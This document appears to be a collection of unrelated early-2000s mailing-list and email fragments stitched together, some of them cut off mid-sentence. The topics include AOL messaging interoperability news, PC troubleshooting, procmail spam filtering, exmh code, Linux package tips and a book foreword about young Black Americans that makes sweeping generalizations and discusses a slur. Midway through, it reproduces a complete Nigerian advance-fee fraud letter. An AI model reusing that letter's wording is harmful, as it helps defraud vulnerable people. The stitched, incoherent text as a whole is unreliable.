 Um yeah, I suppose that'd be useful info...  Western France, La Rochelle
 area.  Test as in test with Linux or just turn on and see that it works?

 I guess that requires something more in the way of budget then...  Given
 that this monitor was serving as the single monitor for 4 boxen (via a
 4-way vga KVM switch), I'd be looking at investing in 4 DVI cards along
 with another KVM to suit while a VGA version _should_ just plug into
 place.

","I suppose the main surprise here is that AOL is coming clean at all. After
 all, its long-running game of talking interop, and doing everything possible
 to prevent open standards in this arena, seemed to have been working fine,
 with most end users completely oblivious to AOL's actions.

 America Online Scales Back Instant-Messaging Compatibility Efforts
 Updated: Tuesday, July 23, 2002 01:23 PM ET
 
 Dow Jones Newswires
 
 NEW YORK -- America Online appears to be scaling back efforts to make its
 instant-messaging service compatible with rival services.
 
 The unit of AOL Time Warner Inc. (AOL, news, msgs) said in a regulatory
 filing it is now focusing on messaging interoperability methods that are
 more limited in scope than the kind envisioned by the Federal Communications
 Commission when it approved the AOL-Time Warner merger in January 2001.
 
 America Online isn't required to make its messaging system interoperable
 with others, but the FCC's merger approval included what it considered to be
 incentives for the company to do so. It also required AOL to file progress
 reports on its interoperability efforts every six months. The most recent
 report, filed last week, disclosed the company's new direction.
 
 The upshot of the strategy shift is that the instant-messaging market isn't
 much closer to broad-based interoperability than it was 18 months ago,
 according to industry analysts. Unlike e-mail, users of most competing
 instant-messaging services still can't directly trade messages. So an
 America Online instant- messaging user can't communicate with a user of
 Microsoft Corp.'s (MSFT, news, msgs) MSN Messenger, except by using
 third-party software such as Trillian.
 
 America Online, the biggest instant-messaging provider, has been criticized
 for blocking users of rival services from gaining access to its users. The
 company also has been accused of dragging its feet amid industry attempts at
 interoperability.
 
 For its part, America Online has said it wants to protect the security of
 its users and the reliability of its system. And it points out that other
 companies have so far failed to agree on interoperability standards.
 
 When the FCC approved the AOL-Time Warner merger, it said that if America
 Online wanted to offer video-conferencing and other advanced
 instant-messaging features over Time Warner's cable lines, it first had to
 enable its instant- messaging users to communicate with users of rival
 services. The intent of the condition was to prevent America Online from
 widening its dominance of the instant-messaging market by exploiting its
 access to Time Warner cable systems.
 
 AOL hasn't yet introduced video features, even though rivals Microsoft and
 Yahoo Inc. (YHOO, news, msgs) did so last year.
 
 Specifically, the FCC said America Online would have to implement a
 technology known as ""server-to-server interoperability"" before it could
 offer video. The technology would allow users of non-America Online services
 to detect when AOL users are online, and to trade messages. It would do so
 via communications between the computer servers operated by each messaging
 provider, using a common language.
 
 But in the progress report filed with the FCC last week, America Online said
 it will ""focus its efforts"" on alternatives to server-to-server
 interoperability. They are more limited in scope than server-to-sever.
 
 As an example of an alternative, America Online cited a recent agreement to
 make its instant-messaging service compatible with a new messaging service
 from Apple Computer Corp. (AAPL, news, msgs). The Apple service, IChat, will
 be included in Mac OS X 10.2, the new Apple operating system set for release
 in August.
 
 IChat users will be able to talk to America Online users, but it won't
 involve server-to-server interoperability. Instead, the actual exchange of
 messages will occur only on America Online's servers, even as IChat
 customers use Apple software.
 
 ""We believe this kind of hosted IM solution provides, at least in the short
 term, a secure, reliable and cost-effective means to provide
 interoperability between AOL, IM and unaffiliated IM communities,"" Steven
 Teplitz, AOL's associate general counsel, wrote in the progress report to
 the FCC.
 
 As to the apparent change in strategy, company spokeswoman Kathy McKiernan
 said Tuesday: ""It's a recognition that server-to-server has proven a hard
 nut to crack for the entire industry."" Indeed, users of America Online's
 rival services can't directly communicate with each other, either.
 
 The alternative solution ""was something that we could implement now to
 provide for IM communities to communicate,"" said Ms. McKiernan, adding
 America Online would explore partnerships with other messaging providers,
 similar to the Apple deal. None has been announced so far.
 
 FCC officials couldn't be reached Tuesday.
 
 America Online hasn't ruled out the possibility that it would someday
 implement server-to-server interoperability. The company has explored the
 technology in the past, including a server-to-server last year with Lotus
 Development, a unit of International Business Machines Corp. (IBM, news,
 msgs).
 
 But America Online's interoperability test with Lotus was ""limited in scope
 and functionality."" True server-to-server technology ""would require further
 significant expenditures of time and resources to develop,"" wrote Mr.
 Teplitz.
 
 The Internet Engineering Task Force, a group devoted to developing Internet
 standards, has been working on a server-to-server messaging technology but
 hasn't yet developed a final version, according to America Online. Task
 force representatives couldn't be reached.
 
 The company's strategy shift means that true interoperability in instant
 messaging is still a couple of years away, according to Michael Gartenberg,
 analyst with Jupiter Research.
 
 ""It's still something the market wants,"" he said. ""At some point, it'll
 happen, but maybe a couple of years down the road.""
 
 Mr. Gartenberg and other analysts believe America Online hasn't actively
 pursued true interoperability because it wants to protect its large user
 base. If messaging systems were compatible, the company could lose ground
 because prospective customers might see no difference in choosing another
 provider, as long as they can reach America Online users.
 
 But partly because of its lack of compatibility and the FCC conditions,
 America Online hasn't kept up with rivals in offering new services. MSN and
 Yahoo have had video-conferencing via instant-messaging since last year. AOL
 has denied that it has held back on video messaging to avoid making its
 system interoperable, arguing there is little consumer demand for it.
 
 But the new features have paid off for the company's rivals, and they are
 catching up. Between last October and April, Microsoft's Messenger user base
 rose 32% to 29.1 million, according to ComScore Media Metrix, while Yahoo's
 base jumped 19% to 19.2 million users. In the same period, the number of
 users of AOL-branded messaging services increased 7% to 54.9 million.

 Here is what you do.
 
 Remove all the PCI & ISA/EISA cards.
 Remove the floppy disk cable from the mobo, the ide cables from the mobo...
 essentially leaving only a video card... ram and a keyboard plugged in.
 
 Turn on the system.
 If it doesn't POST then, switch it off and remove the video card.
 
 Switch it back on ... if your mobo doesn't emit some beeps complaining about
 lack of video card then.
 
 Switch it off.
 Remove it's ram.
 
 Same procedure as above.
 
 If you still don't have any kind of mobo beep codes then you can try as a
 last ditch effort to reseat the cpu... (remembering to never ever ever power
 up your system without a heatsink & fan).
 
 If after reseating the cpu into the mobo... you still get no beep codes,
 from it with just the cpu inserted into the mobo ie(no pci,*isa cards or and
 no actual ide or floppy cables connected to the system)... even though you
 have power... you either have a faulty motherboard or a faulty cpu.
 
 Once you get beep codes various permutations of the above should eventually
 disjunct which device it is, is causing the lack of POST.
 Power On Self Test.

","
                          Foreword
 
 After thirty?three years of being a black man living in ""Ghetto America,"" an environment notorious for danger, crime, and poverty, I have made startling discoveries involving young African?American men and women who comprise what I have come to define as the ""Black Generation X"". I have become aware that there is no formal distinction separating young African?Americans from the general definition of ""Generation X"". Aside from it being regarded as the generation that followed ""Baby Boomers"", it's important to point out there is no root definition for this term as well. Since the theme of this work is centered on identifying the realities and misconceptions of young African?American culture, I have chosen a definition that incorporates all of the components that were part of my birth, childhood, and young adult life. Taken from a web site entitled ""Generation X"", created and maintained by the Colorado College, the definition is as follows: 
  
  ""We are a group of people born between 1961 and 1981. We are individuals who live for the 'here and now', like to experiment, and who require immediate results. We are typically selfish, and cynical, and depend a lot on our parents. We question authority, and feel like we carry the burden of the previous generations. It's that simple. It seems we have come to be called ""Xer's"" simply because we represent something negative to our elders. We may be the one thing all of the generations that precede us have in common, that is the ability to speak assuredly about our shortcomings. Of course, they overlook the fact that we are their responsibility, or actually their fault. Our generation will be called upon to look after our parents knowing they failed to look after us. Intergenerational justice failed somewhere along the way and it will be our task to either rectify it or make it worse.""
 ""We are a group of individuals who grew up with no one at home after school. It appears we have little hope for the future. No jobs, no homes, and basically no money are almost expected of us. These bleak prospects, along with the fact that we will be forced to support the largest amount of senior citizens ever, do not provide much hope. Some believe that these blockades will be too much for us to handle and we will for the most part fail at life, but many see our individualism and resourcefulness that has been built up through our childhood, as our saviors. We will soon discover who is right and who is wrong."" 
 
 This definition is important because it demonstrates the widely held belief that Generation X is comprised of one core group of American citizens. It over generalizes the similarities it expresses, and applies them to all those who were born within the corresponding years. When in fact these ""similarities"" speak primarily to only ""white"" issues and concerns. For instance, ""they"" say ""we"" depend a lot on our parents, but in ghetto America ""we"" could only depend on one our mothers! ""They"" also say, "" . . .we feel like we carry the burden of previous generations,"" and "" . . . we will be forced to support the largest amount of senior citizens ever."" In ghetto America, no one ever gives these issues any thought because survival is in the here and now, and is all ""we"" have time for. 
 I have known for many years that the differences that separate Generation Xer's black and white occupants would eventually be identified. I never knew I would be the one doing it. Extracting the ""Black"" from ""Generation X"" and categorizing it for its own sake is a necessary and important contingency. Without doing so, the social ills that plague Ghetto America would be lost within the generalities that are explained away as part of a collective American identity.
 There are many hidden truths that exist in black America today. ""White America"" charges that we spend our time collecting welfare, refusing to vote, reading elementary styled books, watching music videos, day dreaming of becoming rappers, basketball players, selling drugs, and making babies. Much of this is supported in Marlon Riggs's documentary entitled ""Ethnic Notions."" When African Americans are mentioned, whites typically envision an image that is strikingly similar to the one that graces the cover of this book. A reality that I confirmed while watching ""Roger & Me,"" another documentary written, and directed by Michael Moore. Sadly, many of us have begun to validate this skewed image, while others bend over backwards in an attempt to pretend we do nothing of the kind, only to be contradicted and embarrassed when presented with the daily programming line up for B.E.T. (Black Entertainment Television). Many of us fail to realize, that whatever embarrassment or shame the ex
  posed truth may reveal, should be taken as an opportunity to improve, empower, enlighten, and ultimately change anyone who is guilty of perpetrating this kind of behavior.
 Regarding Black Women: I have known many in my life and although each has had unique attitudes and personalities, I began to notice the majority of them shared the same collective mentality toward black men as a whole-that black men owed them something, and are required to provide and fulfill what was missing from their lives, be it emotional, physical, or economical.
  Normally that type of assertion would not warrant opposition from me, so long as a reciprocal attitude was extended. In most cases, it has not been. It's funny though, looking back, I am surprised I never paid any attention to the beliefs and attitudes that different black women subscribe to, or the various schools of thought they possessed. Many have placed strict demands and presumptions on the African?American male, some fair and some unfair. Much of what the public believes and understands about the black female's social structure is often filtered by others in the black community who believe these inaccurate and frequently positive representations will somehow change the reality that is. 
 What originally sparked my attention was an observation I stumbled upon while skimming through and reading books related to black male and female interaction. I noticed virtually all of the books I read in the genre depict an inaccurate and misleading concentration on the affluent African?American perspective. These stories and commentaries tend to suggest that all African?Americans thrive on a middle?to?upper class professional level. They relay stories of relationship problems with ""Huxtable?like"" bachelors and bachelorettes whose only concern is why the other has not confessed his or her love. As I read these stories I couldn't help but become irritated by the blatant omission of the prevailing majority of blue collar or ""working class"" African?Americans. Although there are those in the black community that can identify with the ""Huxtable?like"" dynamic, unfortunately, they are few and far between. 
 The majority of stories I have read seem to be geared toward fantasizing and romanticizing the oppressive state of affairs that have plagued Black America. The black authors who have written these books fear the potential backlash awaiting anyone who would dare air out our ""dirty laundry"". The fact is, truth should never be stifled by fear of any kind. 
 I recently had a candid conversation with some very dear female friends who stated that although they fully acknowledge the terrible state of affairs many of our women are currently drowning in, they felt that publicizing their predicament would be viewed as a form of betrayal. As our discussion intensified, I reminded them that the only way change can be effected is by increasing public awareness that change is needed, and oftentimes, not exposing the truth can be more crippling than the truth itself. 
 The purpose of my book is in essence an attempt to change the self?destructive thinking and self?imprisoning behavior that ""black male and female generation X"" have been subscribing to. While discussing this with my friend, she suggested I simplify my writing style so my potential black readers could better understand what I'm attempting to convey. Acknowledging the real possibility of my message being misunderstood, I suggest to those readers that if they want to fully appreciate the finer points of this narrative-to grab a dictionary. (Don't feel bad-there were several times I had to as well!)
 Regarding Black Men: An overwhelming number of us have become preoccupied with being cool, buying sports wear, driving expensive cars, wearing gold or platinum jewelry, and often without legitimate personal wealth and while living under the most deplorable conditions! I have chosen to address this rarely acknowledged side of African?American culture because I have lived it. I have seen the chaos and futility that exists on this level. It is a world of ignorance, selfishness, pre?occupation, and idiocy.
 In my world there are people who applaud a lack of education, who brag about having served time in U.S. penitentiaries, the types of guns they carry, dope peddling, and chasing women. They champion the notion of having children without any regard to the poor environment many of them currently inhabit. In this world, wearing expensive clothes and carrying fancy handbags is mandatory even if it means spending their last dollar in order to look like they've got a million. It's a world where children dress in over?priced sports wear, mimicking and idolizing whatever popular athlete or rapper is currently in the public eye. 
 Thinking, such as the belief that fancy clothes are what define one's self?worth, and the possible corruption this thinking breeds, seems to not be an important concern for black mothers. It may come as a shock to know that most African?Americans feel that those who don't have the same, if not better, material possessions, are lesser beings, referring to them as being corny, lame, or broke. Even our ""male rapper"" entertainers promote backward priorities-nothing else matters as long as you look good. ""The Big Tymers"", a popular rap duo, have a song called ""I'm Still Fly"", shown in heavy rotation on B.E.T. and played regularly on black radio stations throughout the country. (""Fly"" is ghetto vernacular for well dressed, also used to describe a female's beauty). Its signature verse asserts:
 
 ""I got gator boots with a pimped out Gucci
 Suit, can't pay my rent cause all my money's
 spent, but that's O.K. cause I'm still fly.""
 
 Worse yet, in the song ""Grinding"", the popular duo ""Eclipse"" glorifies the selling of illegal drugs in inner city neighborhoods as children play and dance throughout the entire video. (The term ""grinding"" is ghetto vernacular for the selling of illegal drugs) The fact that this song and video is also shown in heavy rotation on B.E.T. is further evidence that our world is in utter turmoil. Some of the key lyrics to this song are ""grindingyou know what I keep in the lining"" (the area in their coats where they hide illegal drugs) and
 
 ""Patty cake Patty cake I'm the bakers man
 I bake them cakes as fast as I can
 and you can tell cause of how my bread stack up
 and I disguise it as rap so the feds backup""
 
 In this verse, the group refers to the process of cooking cocaine and its transformation into cocaine base or crack. When created it is compressed into the form of a large cookie with the average diameter being the size of a typical cake. (hence the term ""cake"" or sometimes ""pie"") Unfortunately for the rap genre, this song seems to strengthen the long standing argument posed by most whites that rap music is nothing more than an entertainment medium catering to violent drug offenders, who want and do nothing more than carry guns and break the law. 
 The negative references I've identified have become an integral part of the urban African?American existence. This mutated reality is ridiculous and unacceptable. This ideology should not be permitted to continue any longer than it already has. There is an overwhelming part of the African?American community that is aware of this crippling mentality. There are also many that are unaware and unfortunately, more that do not even care. Those of us who are in the know have a responsibility to educate and enlighten those of us who are not aware of the negative behavior being perpetrated daily. Whether because of habit or misguided values, this type of ideology is cyclical and thrives off of ignorance. It should be apparent to us all that we cannot wait for some other race to come and save us. We must save ourselves! I am well aware that many of you are probably furious by now, and are thinking, what right do I have to express the opinions I have thus far, as well as those I have al
  luded too. 
 I have chosen to chronicle my experiences because of the diversity and seriousness of their content. There is far too much negativity thriving within our culture. There must be acknowledgment and accountability for the truth, whether good or bad. I am aware that not all of ""us"" have succumbed to the crippling mentality that is rampant in our community, and I have chosen to concentrate on individuals who have had a profound impact on my life. Any similarities and generalizations I illustrate are directed solely toward individuals in the black community who share the collective negative thinking and behavior that will hereafter be identified. 
 Additionally, throughout this book I will refer to African?Americans in four different ways; the first being ""African?Americans"", denoting our status as citizens in the United States; secondly, as ""Black"", a reference that identifies and defines our differences and struggles in this country; third, as ""Niggas,"" a term which is often misunderstood and should not be confused with ""Nigger"". The term ""nigga"" has become an accepted form of reference among young black males used to express friendship (hence the term ""My Nigga"") as well as a blanket reference when speaking to, of, or about other black males in a non?personal manner. I felt it necessary to make this distinction because many of the experiences I will refer to mandate the use of the term to effectively communicate the attitude and mood that existed during the time each story took place; and fourth, as ""Ghetto"", this term is largely intended as an internal reference commonly understood by blacks as a means to define the
   less polished members of our community.  It is important to note that the use of either term has no negative connotation and is therefore not to be associated with any feeling as such. 
 My commentary is based on real?life situations, both good and bad, and how one African?American man was affected by them. To that end, I feel it is necessary to acknowledge that my intention is not to condemn the individuals I have encountered. Despite the negativity they have displayed, I only want to make them aware that the selfish and self debasing attitudes they subscribed to, in many ways, has caused them to become their own worst enemy.
 In the case of the black female's negative and limited perspective toward black men, the world, and subconsciously themselves, I submit that this mentality is perhaps single?handedly responsible for the lack of success, happiness, and quality of life that is at the center of every African?American woman's fantasy quest. It is also important to note that the selfish and negative attitudes at the core of the tension that exists between black women and men, has been deliberately created by ""White America"". For example, much of the existing resentment between black women and men can be traced as far back as slavery on up to present day. Many past issues have taken on new identities and have re?emerged in the form of corporate acceptance of black women and the corporate exclusion of black men. The resulting economic independence that some black women now enjoy has caused them to challenge and judge the black man for his absence within corporate America, without realizing and ackno
  wledging that this absence is by design. 
 There are other ""core"" issues that have been passed down and nurtured from generation to generation, such as color barriers, light skin versus dark skin, good hair versus bad hair, loyalty, devotion, and economic status. Believe it or not, there was once a time when black women refused to date a black man if he didn't sell drugs or was not ""thugged out"". (a term for being rough or hoodlum-like) The reasoning behind it being that the ""thug,"" and ""drug dealer"" lifestyle was synonymous with financial independence. 
 These issues, among others, relate directly to the confused mentality that exists within our internal society. Sadly that ""confused mentality"" is responsible for much of the neglect the African American ""ghetto"" community receives at the hands of our more affluent brethren. Who have locked it away in the basement, and seems to be more concerned with convincing the rest of the world that ""ghetto America does not exist. Furthermore, the lack of acknowledgement of which I speak should not be confused with the impoverished masses of the African American community.  Their plight is a well-known reality, but in many cases much of ghetto America falls under that same umbrella. Be advised: this book is not a colorful or lighthearted look into ""Black America"".  Rather it should be viewed as a legitimate tool for identifying and changing the backward thinking that so many young African Americans (including myself) have come to perpetuate. Moreover, that ""backward thinking"" is the main 
  cause of our inability to strive for a common goal. An outcome that must be met; and can only be met, with Godly faith, positive strategy, cooperation, love, loyalty, self and mutual respect.

 Giant horse images 'defaced by hunting activists'
 
 Pro-hunt activists have defaced two of the country's national monuments - 
 the two giant white horses - to highlight their cause.
 
 
 
 Campaigners for the Real Countryside Alliance say they targeted the two 
 images, on hills in Oxfordshire and North Yorkshire, ""to keep the pro-hunt 
 thing in the papers"".
 
 
 
 Aerial shots show the 374ft-long Bronze Age image on the Berkshire Downs 
 near Uffington in Oxfordshire complete with three white hounds and a rider.
 
 In North Yorkshire, a rider in full hunt regalia has been added to the 300ft 
 White Horse cut in to the hills at Kilburn, which dates back to the 1700s.
 
 But no-one reported anything to the police.
 
 A spokesman for North Yorkshire police said no reports had been received but 
 he had seen ""a red blob"" on the horse and had sent officers to investigate.
 
 In Uffington, no-one in the village had heard anything about the reported 
 incident. A spokesman for Thames Valley police said he was not aware of any 
 complaints.
 
 Activists say the image in Oxfordshire was drawn in paint used for marking 
 lines on grass tennis courts and will wash away in the first rains.

 I call it spam if I ask to be removed from the spamming list though. 
 I occasionally buy X-10 stuff.  I've learned from past experiences to 
 create a quick mail alias to get order confs and what not.  Then can 
 it once the order is complete because those spamming SOBs will not 
 stop filling my inbox with 3-6 ads per day.  I've LARTed them and 
 their upstream numerous times asking to be list washed.  I don't even 
 get an auto-ack.  I started a procmail recipe to reject mail to them 
 and include a form letter (I was planning on later appending every 
 piece of x-10 spam I've archived to the form letter for their reading 
 pleasure...) but I haven't gotten it to work.  Bottom line, if I gave 
 them permission to mail me (explicitly or via privacy policy), it's 
 not spam but once I told them to stop mailing me then it's spam.

 Why wait until you're dead? I'm sure there's enough carbon in

","
 
 formail did the trick. Thanks to those who answered. For the sake of
 archives, here's how to ""patch"" ricochet:
 
 
 1. procmailrc (/tmp/pmrc):
 
 RICOCHET=/usr/local/etc/ricochet
 PMDIR=/tmp
 LOGFILE=$PMDIR/pmlog
 VERBOSE=yes
 MAILDIR=/tmp
 LOGABSTRACT=all
 
 :0 f
 | /usr/local/bin/ri2
 
 
 2. /usr/local/bin/ri2 (to test):
 
 #!/bin/sh
 /usr/local/bin/ricochet -DONT_SEND >/tmp/rico.$$
 
 3. formmail exec:
 
 formail -ds procmail /tmp/pmrc </tmp/spm
 
 -end-
 
 Sorry for such brief instructions. The only problem here is that I get
 another copy of the spam in the spambox again. This can be fixed with some
 procmailrc tweaking (the "":0 f"" part).
 
 Cheers,
 -zeek

138,"Subject: How unlucky can you get?
","So, last night around 5:30AM I'm woken up by a loud *craaack*, followed by
 one of the most dreaded sounds a homeowner ever hears: vast quantities of
 water spilling onto the floor. The water is coming from the bathroom, the
 toilet specifically. Turns out the water cistern on the top of the toilet
 had cracked down the side, and was spilling out all the water.
 
 So, after shutting off the water and mopping up, I was left to ponder what
 are the odds of having mechanical failure of a large rectangular porcelain
 bowl, in the absence of any visible stressors (like someone striking it with
 a sledgehammer)? We hadn't done anything unusual to the toilet in the recent
 past -- just normal use. I've *never* heard of this happening to anyone I
 know. The guts, yeah, they fail all the time. But the storage bowl -- never.
 
 Geesh.

     I had that too; I removed libusb (I don't think it needed --nodeps) and then 'apt-get -f install' and all was well.

 The electric cars, motorcycles and dragsters had some great times and I 
 ended up with a few pics and a nice deep burn...
 
 John Waylan (who was interviewed in Wired a few years back) pulled out a

 topping his 13.1sec/99mph run a couple of years ago. He's shooting for a 
 12 second run.
 
 John also took out a replica 1908 Oldsmobile for a respectable 47mph 
 run. (Remember, we started out with electric cars.)
 
 Near the end of the day, Kilacycle took the track with an amazing 111mph 
 run. Talk about a crotch rocket.

 After sending the report I started fiddling with the Ftoc_RescanLine 
 stuff and I havn't seen it since. I can't really tell if it was my 
 hacking that removed it, or if it was some transitional magic 
 happening since this was the first invocation of that version of 
 exmh. I've backed out my stuff now, and'll let you know if it happens 
 again.
 
 
 On another thing with the Ftoc_RescanLine stuff. This routine is 
 called at times still unclar to me. An inspection of the routine 
 suggests that it is used in the transition of a message to/form 
 ""current"" state to re-paint the ftoc line. However, checking the 
 msg.tcl code (MSgChange) we find:
 
     if {$msgid != {}} {
         # Allow null msgid from Msg_ShowWhat, which supplies line 
 instead
         if {$msgid < 0}  return
     } else {
         # line null too, try using first in folder
         if {[string length $line] == 0} { set line 1 }
         set msgid [Ftoc_MsgNumber [Ftoc_FindMsg $msgid $line]]
     }
     Ftoc_ClearCurrent
     Mh_SetCur $exmh(folder) $msgid
     Ftoc_ShowSequences $exmh(folder)
 
 The Ftoc_ClearCurrent calls Ftoc_RescanLIne to clear the '+' sign 
 _before_ the on-disk transition is made. I hacked this stuff and more 
 or less changed the order. It works, but fails on some folder changes.
 
 My feeling of this is that we really do not want to have a 
 Ftoc_ClearCurrent, but rather just a RescanLine and the caller had 
 better know the line or msgid. That routine shoud just put in the '+' 
 if the line/msg in question happened to be the cur msg. Thoughts?

 FEDERAL MINISTRY OF WORKS AND HOUSING
 FEDERAL SECRETARIAT OFFICE COMPLEX
 IKOYI-LAGOS.
 
 ATTN:,                  
 
 First, I must solicit your strictest confidence in this transaction, this is by virtue of its nature as being utterly confidential and top secret as you were introduced to me in confidence through the Nigeria Chamber of Commerce and Industries.
 
 We are top officials from the Federal Ministry of Works and Housing,(FMW&H), Federal Ministry of Finance and the Presidency, making up the Contract Review Panel(CRP) set up by the Federal Government of Nigeria to review contracts awarded by the past military administration. 
 
 In the course of our work on the CRP, we discovered this fund which resulted from grossly over - invoiced contracts which were executed for the FMW&H during the last administration.The companies that executed the contracts have been duly paid and the contracts commissioned leaving the sum of US$21.4 Million floating in the escrow account of the Central Bank of Nigeria ready for payment.
 
 I have therefore  been mandated as a matter of trust by my colleagues in the panel to look for an overseas partner to whom we could transfer the sum of US21.4 legally subcontracting the entitlement to your company.This is bearing in mind that our civil service code of conduct forbids us from owning foreign companies or operating foreign accounts while in government service, hence the need for an overseas partner.
 
 We have agreed that the funds will be shared thus after it has been paid into your account.
 (1) 30% of the money will go to you for acting as the beneficiary of the fund.
 (2) 10% has been set aside as an abstract projection for reimbursement to both parties for incidental expences that may be incurred in the course of the transaction.
 (3) 60% to us the government officials (with which we intend to commence an importation business in conjunction with you)

 you look to have 2 versions of spamd installed.  The one running from

 but the one you run from the commandline seems to be a 2.4x version.
 
 I would find that old version of SA and blow it away.

 http://www.timesonline.co.uk/printFriendly/0,,1-43-351083,00.html
 
 ------------------------------------------------------------------------------
 TONY BLAIR's special relationship with George W. Bush is under
 considerable strain. Not only do the two disagree on Yassir Arafat's
 tenure as leader of the Palestinian Authority, but Blair has started
 telling disparaging anecdotes about the President.
 
 Baroness Williams of Crosby recalled a story told to her by 'my good
 friend Tony Blair' recently in Brighton. Blair, Bush and Jacques
 Chirac were discussing economics and, in particular, the decline of
 the French economy. 'The problem with the French,' Bush confided in
 Blair, 'is that they don't have a word for entrepreneur.'

 What a load of crap. Politics are somehow more muddy now?  I'd say that 
 its considerably
 clearer - the vast majority of people feel disenfranchised, and the 
 common practice of
 putting protestors in boxes is done usually to hide them from TV 
 cameras, visiting dignitaries,
 etc, further exacerbating those feelings.
 ""Unpeaceably disrupting political rallies"" is now usually done by police 
 with riot gear and pepper spray.
 
 We had a good one here a month or so ago - a few people peaceably 
 strayed from the permit area,
 which was nearly a mile from the site of the meeting of finance 
 ministers held here (the motorcade drove
 by it for about 10 seconds), and were immediately gassed,  beaten and 
 arrested. Not very muddied at all.

160,"Subject: Priceless
","URL: http://www.mozillazine.org/weblogs/hyatt/#85443744
 Date: Not supplied
 
 I just finished reading an article about Mozilla[1] for Salon.com[2]. This 
 excerpt was rather amusing.
 
 _It is a good question, because in almost every way, Mozilla is a better 
 browser than Navigator. For example, Netscape's best new feature, tabbed 
 browsing -- which lets you have several Web pages open in the same browser 
 window, and allows you to bookmark all the pages under one name -- was in 
 Mozilla many months ago, and the Mozilla project that created it (called 
 MultiZilla) already has an improved version available. When asked about this, 
 Yecies, of Netscape, said, ""That's true, but the engineer who's working on it 
 [for Mozilla] is a Netscape employee. It was always done with the intention of 
 fostering general browsing usability for Netscape."" 
 _
 Yes, ok, I suppose that's true if by ""Netscape employee"" you really meant 
 ""Apple employee."" and by ""always done with the intention of fostering general 
 browsing usability for Netscape"" you meant ""was done in a weekend for Mozilla 
 because I thought MultiZilla was cool."" 
 
 Here's how the whole tabbed browsing thing happened. One night I finally 
 downloaded an extension called MultiZilla (go check it out on mozdev.org[3]. I 
 was particularly impressed with a feature contained in MultiZilla called tabbed 
 browsing. I started doing research and discovered NetCaptor[4], a tabbed 
 browser that embedded WinIE. 
 
 MultiZilla was cool but at the time suffered from two fundamental flaws that 
 prevented the code from being incorporated into the Mozilla tree. The first was 
 a UI flaw, namely that at the time it had ripped off NetCaptor down to the last 
 context menu item. The GUI was similar enough that there would have been 
 definite concerns about so obviously copying some of NetCaptor's more obscure 
 capabilities (like sticky names and tab locking). The second concern was that 
 the tab behavior wasn't encapsulated cleanly into a widget. 
 
 I produced a simplified version of tabbed browsing on my own time (did it in a 
 weekend) that removed some of the geekier NetCaptor features and that 
 encapsulated the tab behavior so that the changes to other Navigator files 
 would be minimal. Once I established that it didn't degrade performance in the 
 single tab case, I checked it in as an experiment.
 
 The response was overwhelming, as were the bugs that started being filed. So 
 much so that at first I wanted to back tabbed browsing out of the tree. I was 
 overruled by Mozilla, which turned out to be a good thing for all I think. :) 
 Even with all the excitement and hoopla surrounding the advent of tabbed 
 browsing on the engineering side (and in the Mozilla community), Netscape still 
 didn't get it. Netscape marketing prioritized all sorts of useless work that 
 nobody had even started above tabbed browsing in their marketing document. They 
 continued to do so for months, simply not getting it. It was this odd curiosity 
 that one of their engineers had checked in, and they didn't know what to make 
 of it.
 
 Only after the press raved about it did Netscape really jump on board. I'm sure 
 Netscape is doing the same thing now with popup blocking. Can't you just see it 
 now? We'll have a Popup Manager, and a Manager to manage the Popup Manager, and 
 twenty-seven preferences for fine-grained control of all aspects of popups. 
 
 Can you believe how disfunctional Netscape is? When their engineers say ""you 
 should do this"" or ""you should do that"", they get completely ignored (or blown 
 off), but when CNet says ""We didn't like this, or we didn't like that."", 
 Netscape scurries to meet their demands. That is simply pathetic.

 You know it's stupid - I know it's stupid. Nonetheless, Microsoft has tried
 to spread FUD about the viral nature of the GPL to make CEO/CIO level people
 (often not the most technically clueful, even the CIOs) fear that if they so
 much as use a Linux box, as, say, a print server, they'll have to make their
 company's entire IP public. (I don't think Microsoft said precisely what I
 jsut said, but that was the tenor of the remarks). And their marketing
 budget is a tad bigger than yours or mine.

 mention bazillion bug fixes.
 
 The full [1]announcement is available, and you can read [2]what is new in
 5.8.0, and if you like what you see, start [3]installing.
 
 Since this release has extensive support for non-Latin scripts, we also
 translated the announcement to [4]Traditional Chinese (Big5-ETEN),
 [5]Simplified Chinese (EUC-CN or GB2312), [6]Japanese (EUC-JP), and
 [7]Korean (EUC-KR) (by Autrijus Tang, Dan Kogai, and Jungshik Shin).

 As a new user of SA, I guess I'm having trouble connecting the dots.  If 
 I understand you:  If I don't use the ""nomime"" => 1 option and I recieve 
 MIME mail, the Mail::Internet modules become unavailable.
 
 Unavailable for which?  MA?  SA?  What do these methods do?  Does this 
 mean my incoming MIME mail won't be checked by SA unless I specify 
 ""nomime"" => 1?
 
 Thanks,
 Phil

 1)  I think the code is still very much pre-beta.
 
 2)  When you go to the ""Download"" page, it tells you ""Fetch the latest
 versions of razor-agents and razor-agents-sdk packages""  It is not at all
 clear that these are development packages.
 
 The site is badly designed, and very misleading.  IMO.  The fact that the
 word ""beta"" appears in the middle of some introductory text on the front
 page is hardly a valid argument.  (Well accepted software design ""fact"":
 USERS DON'T READ *ANYTHING*)
 
 I get the impression that Vipul & co are deliberately trying to mislead

 Its a little confusing but you install rpms like
 rpm -ivh packagename-0.1.1.rpm 
 uninstalls must be done without the version info like
 rpm -e packagename   ie: rpm -e sendmail or 
 rpm -e sendmail-devel. 
 
 give that a go and it should work np.

 I worked on a testharness for (wait for it) petrol pumps some years ago,
 little embeded controller spoke to its DOS (not exactly the easiest
 environment to track crashing bugs under) master which logged its
 piteous whinings. I inherited the dos part of it and worked mostly on
 creating the other end of it. Near the end of the project we gave it
 extensive long burnin tests, sadly overnight tests would always crash
 out for some obscure reason.  Tracking it down showed that my
 predecessor's ""add new entries to the end of its linked list"" function
 recursively called itself with each following link until the terminating
 one showed up. Of course it died miserably when it ran out of stack. I'm
 sure he felt he'd done a good days work when he planted that bomb for
 me.

 I guess/hope some other people from the list will try it out ;-)
 
 Both problems you reported (libasound.so and wrong xine dependency) are now
 fixed in the current packages.
 
 Oh, it's maybe also worth pointing out : I've implemented at last sorting
 by both last change date and alphabetically for my ""build list"" in the php
 code : http://freshrpms.net/builds/
 
 And yes, I accept patches/comments/suggestions about all those spec files!

 So, just write-protect the hard disk for partitions that are static.
 I seem to recall an article on this (early 80's, Byte magazine, perhaps?)

 You should also enable raw mode (ctrl-w) and delimiters (ctrl-r) before 
 directing messages to the pipe. Raw mode includes the headers and 
 delimiters allow several messages to be submitted.

 I'm changing my website and want to use pictures for the links to other pages. 
 But, someone told me I should still put a 'click here' underneath all the 
 pictures. To me, this removes all purpose of using the pictures.  <p>
 
 How can I get across that you click on the pictures to get to other pages 
